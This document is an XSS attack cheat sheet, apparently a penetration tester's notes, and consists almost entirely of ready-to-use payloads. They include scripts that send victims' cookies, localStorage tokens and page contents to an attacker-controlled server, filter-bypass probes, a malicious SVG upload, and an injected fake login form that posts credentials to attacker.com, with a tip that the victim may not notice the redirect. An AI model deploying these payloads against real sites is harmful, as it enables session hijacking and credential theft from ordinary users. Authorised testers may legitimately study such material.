Steal Cookies
-----------------------
```
# Will not work if HttpOnly is in cookie header (modern browsers will block this)
# Use ruby SSL server or apache with SSL enabled for SSL connections
# Start Python Web Server
python -m SimpleHTTPServer 80
# Start PHP Web Server
php -S xxx.xxx.xxx.xxx:<port>
# Attack Script
<script>document.location="http://192.168.0.60/?c="+document.cookie;</script>
<script>new Image().src="http://192.168.0.60/index.php?c="+document.cookie;</script>
```

Using XSS to Stealing Sensitive Data from LocalStorage (Untested but looks cool)
-----------------------
```
# https://medium.com/redteam/stealing-jwts-in-localstorage-via-xss-6048d91378a0
<script>alert(JSON.stringify(localStorage))</script>
<img src=’https://xxx.xxx.xxx.xxx/yikes?jwt=’+JSON.stringify(localStorage);’--!>
```

Mouseover test
-----------------------
```javascript
<a href="" onmouseover="javascript:alert('HackerOne MkSecurity Dom XSS');">Click for Detail</a>
```

Use to test if script "<script>alert(123)</script>" tags are being blocked
-----------------------
```javascript
ackerokm7x<img src=a onerror=alert(1)>y09fr
ackerokm7x<img%20src=a%20onerror=alert(1)>y09fr
```

Testing for DOM based XSS
-----------------------
```
Modern browsers are not vulnerable? Must use Internet Explorer for proof of vuln.
Open Internet Explorer
Press F12
Select the "Emulation" tab
Select "Document Mode" "7" (Try other versions if one does not work)
Reload the page

The "#" symbol in this case means pass everything after it to the DOM
http://xxx.xxx.xxx.xxx/xss/example9.php#<script>alert(123)</script>
```


Submits credentials to the www.attacker.com, technically this is HTML Injection (Embeds Login Screen inside application)
-----------------------
```
# php -S xxx.xxx.xxx.xxx:80
# or
# service apache2 start 
# tail -f /var/log/access.log

# Gets stuck on attackers page, do the following to resolve issue, victim may not notice the redirect :)

# In Apache, edit index.html to look like this 
<meta http-equiv="refresh" content="0;url=https://victims.website.com/link-they-started-on/">

<h3>Please login to proceed</h3> <form action=http://www.attacker.com>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>
```

Collect page source code (may contian sensitive data)
----------------------------
```
<script>new Image().src="https://www.attacker.com/bogus.php?output="+document.body.innerHTML</script>
```

XSS using SVG via file upload.
----------------------------
```
<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg">
<polygon id="triangle" points="0,0 0,50 50,0" fill="#009900" stroke="#004400"/>
<script type="text/javascript">
<script>document.location="http://www.attacker.com/?c="+document.cookie;</script>
</script>
</svg>
```
